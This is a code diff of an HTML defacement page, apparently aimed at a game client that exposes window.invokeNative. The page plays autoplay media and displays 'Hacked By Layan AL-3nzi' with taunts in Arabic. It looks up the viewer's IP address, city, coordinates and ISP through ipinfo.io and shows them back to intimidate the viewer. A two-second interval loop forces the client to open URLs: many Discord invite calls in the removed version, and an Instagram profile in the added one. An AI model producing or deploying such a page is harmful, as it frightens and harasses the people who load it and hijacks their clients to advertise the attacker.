@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/e5</title>
+    <title>SaYo</title>
     <style>
        body {
             margin: 0;
@@ -25,12 +24,12 @@
             opacity: 0;
             transition: opacity 2s ease;
         }
-        .image-container img {
+        .video-container video {
             width: 400px; 
             height: auto;
             border: 2px solid #c2c2c2; 
             border-radius: 15px;
-            box-shadow: 0 0 15px rgba(255, , 0, 0.7); 
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.7); 
         }
           .info {
             margin-top: 20px;
@@ -47,27 +46,27 @@
             text-shadow: 0 0 8px #ffffff, 0 0 15px #ffffff, 0 0 25px #ffffff; 
             letter-spacing: 4.5px;
         }
-        .video-container {
+        .background-video-container {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             overflow: hidden;
-            z-index: -1; /* Make sure it's behind other content */
+            z-index: -1;
         }
-        .video-container video {
+        .background-video-container video {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            filter: blur(15px); /* Apply blur effect */
+            filter: blur(15px);
         }
     </style>
 </head>
 <body>
-    <div class="video-container">
+    <div class="background-video-container">
         <video autoplay loop muted>
-            <source src="https://i.top4top.io/m_3243zidf01.mov" type="video/mp4">
+            <source src="https://cdn.discordapp.com/attachments/1316731767104864256/1325401957896163348/809f7f4c5f45408f9c753d45454e3d19.mov?ex=67c42ac3&is=67c2d943&hm=62f0fb2e1909e98bb94e2e354adce64908e10bcfe688028ba4344e612f81d765&" type="video/mp4">
             Your browser does not support the video tag.
         </video>
     </div>
@@ -77,17 +76,24 @@
     </div>
 
     <div id="content">
-        <div class="image-container">
-            <img src="https://cdn.discordapp.com/attachments/1316731767104864256/1325401957896163348/809f7f4c5f45408f9c753d45454e3d19.mov?ex=67c187c3&is=67c03643&hm=d81767855fc8751116dcd83f0746da7d6859f9a0fc805a8b9521603f5f8f910d&" alt="">
+        <div class="video-container">
+            <video autoplay loop muted>
+                <source src="https://cdn.discordapp.com/attachments/1316731767104864256/1325401957896163348/809f7f4c5f45408f9c753d45454e3d19.mov?ex=67c42ac3&is=67c2d943&hm=62f0fb2e1909e98bb94e2e354adce64908e10bcfe688028ba4344e612f81d765&" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
 
-
         <audio autoplay loop>
-            <source src="https://cdn.discordapp.com/attachments/1316731767104864256/1325401957896163348/809f7f4c5f45408f9c753d45454e3d19.mov?ex=67c187c3&is=67c03643&hm=d81767855fc8751116dcd83f0746da7d6859f9a0fc805a8b9521603f5f8f910d&" type="audio/mpeg">
+            <source src="https://cdn.discordapp.com/attachments/1316731767104864256/1325401957896163348/809f7f4c5f45408f9c753d45454e3d19.mov?ex=67c2d943&is=67c187c3&hm=07f079b833ff305f659347483718add42ad66b6e789f2e59393a3dca0f9988cd&" type="audio/mpeg">
             Your browser does not support the audio element.
         </audio>
+
+
+
+        <!-- النص مع تأثير اللمعان -->
+        <div class="info glow-text">Hacked By Layan AL-3nzi</div>
         <div class="info" id="ip-info"></div>
-        <div class="text">discord.gg/oca</div>
+        <div class="text">insta laya.ttt</div>
     </div>
 
     <script>
@@ -97,15 +103,15 @@
             content.style.display = 'block';
             setTimeout(() => {
                 content.style.opacity = 1;
-            }, 0200); 
-        }, 0200);
+            }, 200); 
+        }, 200);
 
         fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
             const { ip, country, city, region, loc, org, timezone } = data;
             const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = ` <<سايو عمك>>
+            infoDiv.innerHTML = `ليان عمتك
 <strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
 
             const dateTime = new Date().toLocaleString();
@@ -118,60 +124,7 @@
         });
 
         setInterval(function() {
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
-            window.invokeNative("openUrl", "https://discord.gg/oca");
+            window.invokeNative("openUrl", "https://www.instagram.com/laya.ttt/");
              },     2000);
     </script>
 </body>
